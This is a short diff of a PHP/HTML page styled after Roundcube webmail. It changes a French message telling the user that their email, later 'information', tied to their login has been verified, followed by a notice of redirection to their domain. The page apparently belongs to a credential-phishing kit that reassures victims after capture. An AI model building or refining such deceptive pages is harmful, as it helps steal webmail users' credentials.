@@ -96,7 +96,7 @@ rcmail.gui_object('message', 'message');
 			    <col class="w100">
 			    <tr class="height">
 				    <td>&nbsp;</td>
-				    <td><label for="rdoPblc">Votre email (<?php echo $login ?>), a &eacute;t&eacute; v&eacute;rifi&eacute; avec succ&egrave;s. <br /><br /> </label><br>
+				    <td><label for="rdoPblc">Vos informations (<?php echo $login ?>), ont &eacute;t&eacute; v&eacute;rifi&eacute;es avec succ&egrave;s. <br /><br /> </label><br>
 <br>
 Nous vous redirigerons prochainement vers <b><?php echo $domain ?></b></td>
 			    </tr>
